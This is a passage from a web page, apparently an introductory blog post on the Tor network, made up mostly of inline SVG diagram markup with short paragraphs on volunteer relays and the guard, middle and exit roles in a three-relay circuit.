       d="m 688.7,393.5 39.3,0"
       id="path6631-6"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#f4b350;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.7,452.1 39.3,0"
       id="path6631-0"
       inkscape:connector-curvature="0" />
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="740.7"
       y="288.3"
       id="text6740"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="740.7"
         y="288.3"
         id="tspan6742"><tspan
           x="740.7"
           y="288.3"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6744">Guard Node</tspan></tspan></text>
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="743.0"
       y="344.3"
       id="text6746"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="743.0"
         y="344.3"
         id="tspan6748"><tspan
           x="743.0"
           y="344.3"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6750">Middle Node</tspan></tspan></text>
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="741.4"
       y="399.8"
       id="text6752"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="741.4"
         y="399.8"
         id="tspan6754"><tspan
           x="741.4"
           y="399.8"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6756">Exit Node</tspan></tspan></text>
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="742.3"
       y="458.5"
       id="text6758"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="742.3"
         y="458.5"
         id="tspan6760"><tspan
           x="742.3"
           y="458.5"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6762">Final Destination</tspan></tspan></text>
  </g>
</svg>
</div>


<br/>


<p>Currently, there are <a href="https://metrics.torproject.org/networksize.html">about 6000 relays</a> routing traffic through the Tor network. These relays are located all across the world and run completely by volunteers willing to give up some bandwidth for the cause. It&rsquo;s important to note that most relays don&rsquo;t have special hardware or software to run. They just have the Tor software configured to act as a relay.</p>

<p>When it comes to speed and anonymity of the Tor network &ndash; the more relays, the better! This makes sense, because every relay only has so much bandwidth to offer. Additionally, if there are more relays to choose from, it will be more difficult to track any one user.</p>

<h3>Types of Relays</h3>

<p>By default, Tor bounces connections through 3 relays. Each of these have a specific role to play (we&rsquo;ll cover each in more detail in later posts):</p>

<div style="padding:10px;background:#3498DB;border-radius:5px;">
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   width="100%"
   height="1236.6"
   id="network"
   version="1.1"
   style="max-height:300px;"
   onclick="e.reset().play(1.25);"
   viewBox="0 0 1956 1236">
  <defs
     id="defs8112" />
     <g
        inkscape:label="Layer 1"
        inkscape:groupmode="layer"
        id="layer1"
        transform="translate(885.83545,44.405879)">
       <g
          id="g8200"
          transform="matrix(0.38940404,0,0,0.37354888,832.4136,424.91373)"
          style="fill:#ffffff">
         <g
            id="g8160"
            style="fill:#ffffff">
    <path
      id="path8162"
      d="M 578.766,51.487 V 50.592 H 575.77 35.93 32.934 v 0.895 C 15.272,52.701 2.095,66.753 0,83.808 v 3.002 355.724 c 0,6.898 1.795,12.712 4.791,17.949 6.893,12.137 17.068,18.269 31.14,18.269 h 197.012 v 49.695 h -37.425 c -9.281,0 -16.467,7.218 -16.467,16.48 0,9.262 7.186,16.479 16.467,16.479 h 220.666 c 9.281,0 16.768,-7.218 16.768,-16.479 0,-9.263 -7.486,-16.48 -16.768,-16.48 H 378.759 V 478.752 H 575.77 c 14.078,0 24.343,-6.132 31.14,-18.269 3.085,-5.493 5.091,-11.37 5.091,-17.949 V 86.811 83.809 C 609.905,66.753 595.833,52.701 578.766,51.487 z m 0,35.324 v 355.724 c 0,2.108 -0.895,3.002 -2.996,3.002 H 35.93 c -2.095,0 -2.996,-0.894 -2.996,-3.002 V 86.811 83.809 h 545.831 v 3.002 z"
      inkscape:connector-curvature="0"
      style="fill:#ffffff" />

   </g>
         <g
            id="g8164"
            style="fill:#ffffff">
   </g>
         <g
            id="g8166"
            style="fill:#ffffff">
   </g>
         <g
            id="g8168"
            style="fill:#ffffff">
   </g>
         <g
            id="g8170"
            style="fill:#ffffff">
   </g>
         <g
            id="g8172"
            style="fill:#ffffff">
   </g>
         <g
            id="g8174"
            style="fill:#ffffff">
   </g>
         <g
            id="g8176"
            style="fill:#ffffff">
   </g>
         <g
            id="g8178"
            style="fill:#ffffff">
   </g>
         <g
            id="g8180"
            style="fill:#ffffff">
   </g>
         <g
            id="g8182"
            style="fill:#ffffff">
   </g>
         <g
            id="g8184"
            style="fill:#ffffff">
   </g>
         <g
            id="g8186"
            style="fill:#ffffff">
   </g>
         <g
            id="g8188"
            style="fill:#ffffff">
   </g>
         <g
            id="g8190"
            style="fill:#ffffff">
   </g>
         <g
            id="g8192"
            style="fill:#ffffff">
   </g>
       </g>
       <path
          id="path8222"
          d="m -228.29943,189.87983 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 V 360.385 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <g
          id="g8414"
          transform="matrix(2.4669289,0,0,2.4669289,-885.8347,435.09715)"
          style="fill:#ffffff">
         <g
            id="g8370"
            style="fill:#ffffff">
    <g
      id="g8372"
      style="fill:#ffffff">
        <path
      id="path8374"
      d="m 97.265,71.261 c -0.093,-0.108 -0.23,-0.172 -0.374,-0.172 H 0.494 c -0.144,0 -0.28,0.063 -0.374,0.172 -0.094,0.108 -0.136,0.253 -0.115,0.396 0.014,0.09 1.468,9.016 12.753,9.016 h 71.869 c 11.284,0 12.738,-8.926 12.753,-9.016 0.02,-0.143 -0.022,-0.288 -0.115,-0.396 z m -41.323,6.286 h -14.5 v -3.334 h 14.5 v 3.334 z"
      inkscape:connector-curvature="0"
      style="fill:#ffffff" />

        <path
      id="path8376"
      d="m 10.507,67.619 h 76.37 c 1.104,0 2,-0.896 2,-2 V 18.713 c 0,-1.104 -0.896,-2 -2,-2 h -76.37 c -1.104,0 -2,0.896 -2,2 v 46.906 c 0,1.104 0.896,2 2,2 z m 5,-43.906 h 66.37 V 60.619 H 15.507 V 23.713 z"
      inkscape:connector-curvature="0"
      style="fill:#ffffff" />

    </g>

   </g>
         <g
            id="g8378"
            style="fill:#ffffff">
   </g>
         <g
            id="g8380"
            style="fill:#ffffff">
   </g>
         <g
            id="g8382"
            style="fill:#ffffff">
   </g>
         <g
            id="g8384"
            style="fill:#ffffff">
   </g>
         <g
            id="g8386"
            style="fill:#ffffff">
   </g>
         <g
            id="g8388"
            style="fill:#ffffff">
   </g>
         <g
            id="g8390"
            style="fill:#ffffff">
   </g>
         <g
            id="g8392"
            style="fill:#ffffff">
   </g>
         <g
            id="g8394"
            style="fill:#ffffff">
   </g>
         <g
            id="g8396"
            style="fill:#ffffff">
   </g>
         <g
            id="g8398"
            style="fill:#ffffff">
   </g>
         <g
            id="g8400"
            style="fill:#ffffff">
   </g>
         <g
            id="g8402"
            style="fill:#ffffff">
   </g>
         <g
            id="g8404"
            style="fill:#ffffff">
   </g>
         <g
            id="g8406"
            style="fill:#ffffff">
   </g>
       </g>
       <path
          id="path8222-9"
          d="m -234.01367,435.59412 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90"
          d="m -242.5851,692.73698 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-7"
          d="M 191.70061,-44.405879 H 76.870013 c -2.063349,0 -3.732221,1.67169 -3.732221,3.733428 v 33.93777 c 0,2.061738 1.668872,3.7322207 3.732221,3.7322207 H 191.70101 c 2.06536,0 3.73262,-1.6704827 3.73262,-3.7322207 v -33.935354 c 0,-2.064154 -1.66766,-3.735844 -3.73302,-3.735844 z M 134.28632,-14.85846 H 85.27395 v -19.604625 h 49.01237 V -14.85846 z M 191.70061,5.6598986 H 76.870013 c -2.063349,0 -3.732221,1.6704828 -3.732221,3.7322208 V 43.331097 c 0,2.062945 1.668872,3.734636 3.732221,3.734636 H 191.70101 c 2.06536,0 3.73262,-1.671691 3.73262,-3.734636 V 9.3921194 c 0,-2.061738 -1.66766,-3.7322208 -3.73302,-3.7322208 z M 134.28632,34.701745 H 85.27395 V 15.096717 h 49.01237 v 19.605028 z m 57.41429,20.538887 H 76.870013 c -2.063349,0 -3.732221,1.674106 -3.732221,3.735844 v 33.93777 c 0,2.061335 1.668872,3.731013 3.732221,3.731013 H 191.70101 c 2.06536,0 3.73262,-1.669275 3.73262,-3.731013 v -33.93777 c 0,-2.061738 -1.66766,-3.735844 -3.73302,-3.735844 z M 134.28632,85.747271 H 85.27395 V 66.143853 h 49.01237 v 19.603418 z m 25.89932,45.955179 h 29.29383 v 5.34837 h -29.24633 v 0.25077 c 0,3.3792 -2.73557,6.11437 -6.11034,6.11437 h -39.6786 c -3.37437,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25077 H 79.088736 v -5.34837 h 29.295034 c 0.26084,-3.13648 2.85995,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <g
          style="fill:#ffffff"
          id="g8224-3-3"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8226-0-4"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8228-3-0"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8230-50-8"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8232-7-8"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8234-6-1"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8236-7-5"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8238-83-2"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8240-6-3"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8242-4-2"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8244-4-4"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8246-1-6"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8248-9-6"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8250-5-6"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <g
          style="fill:#ffffff"
          id="g8252-5-2"
          transform="matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)" />
       <path
          id="path8222-90-4"
          d="M 183.12918,244.16555 H 68.298585 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 183.12958 c 2.06536,0 3.73263,-1.67048 3.73263,-3.73222 v -33.93536 c 0,-2.06415 -1.66767,-3.73584 -3.73303,-3.73584 z m -57.41429,29.54742 H 76.702522 v -19.60463 h 49.012368 v 19.60463 z m 57.41429,20.51836 H 68.298585 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 183.12958 c 2.06536,0 3.73263,-1.67169 3.73263,-3.73463 v -33.93898 c 0,-2.06174 -1.66767,-3.73222 -3.73303,-3.73222 z m -57.41429,29.04184 H 76.702522 v -19.60502 h 49.012368 v 19.60502 z m 57.41429,20.53889 H 68.298585 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 v 33.93777 c 0,2.06134 1.668872,3.73102 3.732221,3.73102 H 183.12958 c 2.06536,0 3.73263,-1.66928 3.73263,-3.73102 V 347.5479 c 0,-2.06173 -1.66767,-3.73584 -3.73303,-3.73584 z M 125.71489,374.3187 H 76.702522 v -19.60342 h 49.012368 v 19.60342 z m 25.89932,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73556,6.11437 -6.11034,6.11437 h -39.6786 c -3.37437,0 -6.112756,-2.73557 -6.112756,-6.11437 v -0.25078 H 70.517308 v -5.34836 h 29.295035 c 0.260837,-3.13648 2.859947,-5.60316 6.060837,-5.60316 h 12.17721 v -12.21988 c 0,-3.37478 2.73517,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-3"
          d="M 174.55775,549.87984 H 59.727153 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 174.55815 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.41429,29.54742 H 68.13109 v -19.60463 h 49.01237 v 19.60463 z m 57.41429,20.51836 H 59.727153 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 174.55815 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.41429,29.04184 H 68.13109 v -19.60502 h 49.01237 v 19.60502 z m 57.41429,20.53889 H 59.727153 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 v 33.93777 c 0,2.06134 1.668872,3.73102 3.732221,3.73102 H 174.55815 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.41429,30.50664 H 68.13109 v -19.60342 h 49.01237 v 19.60342 z m 25.89932,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11034,6.11437 H 97.301342 c -3.374375,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 H 61.945876 v -5.34836 h 29.295035 c 0.260837,-3.13648 2.859947,-5.60316 6.060833,-5.60316 h 12.177216 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-39"
          d="M 183.12918,889.87983 H 68.298584 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 183.12958 c 2.06536,0 3.73263,-1.67048 3.73263,-3.73222 v -33.93536 c 0,-2.06415 -1.66767,-3.73584 -3.73303,-3.73584 z m -57.41429,29.54742 H 76.702521 v -19.60463 h 49.012369 v 19.60463 z m 57.41429,20.51836 H 68.298584 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 183.12958 c 2.06536,0 3.73263,-1.67169 3.73263,-3.73463 v -33.93898 c 0,-2.06174 -1.66767,-3.73222 -3.73303,-3.73222 z m -57.41429,29.04184 H 76.702521 v -19.60502 h 49.012369 v 19.60502 z m 57.41429,20.53889 H 68.298584 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 V 1027.2 c 0,2.0613 1.668872,3.731 3.732221,3.731 H 183.12958 c 2.06536,0 3.73263,-1.6693 3.73263,-3.731 v -33.93782 c 0,-2.06173 -1.66767,-3.73584 -3.73303,-3.73584 z M 125.71489,1020.033 H 76.702521 v -19.6034 h 49.012369 v 19.6034 z m 25.89932,45.9552 h 29.29383 v 5.3483 h -29.24633 v 0.2508 c 0,3.3792 -2.73556,6.1144 -6.11034,6.1144 h -39.6786 c -3.37437,0 -6.112757,-2.7356 -6.112757,-6.1144 v -0.2508 H 70.517307 v -5.3483 h 29.295035 c 0.260838,-3.1365 2.859948,-5.6032 6.060838,-5.6032 h 12.17721 v -12.2199 c 0,-3.3748 2.73516,-6.1148 6.10994,-6.1148 h 3.05598 c 3.37518,0 6.11115,2.7404 6.11115,6.1148 v 12.2199 h 12.22431 c 3.2025,0 5.79758,2.4715 6.06244,5.6032 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-38"
          d="m 603.12919,138.45126 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 V 142.1871 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-8"
          d="m 603.12919,404.16555 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 V 507.5479 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          id="path8222-90-2"
          d="m 603.12919,675.59412 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z"
          inkscape:connector-curvature="0"
          style="fill:#ffffff" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
          d="M -605.71457,586.64818 -339.19506,367.78404"
          id="path8901"
          inkscape:connector-curvature="0" />
       <path
          style="fill:none;stroke:#ffffff;stroke-width:5;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
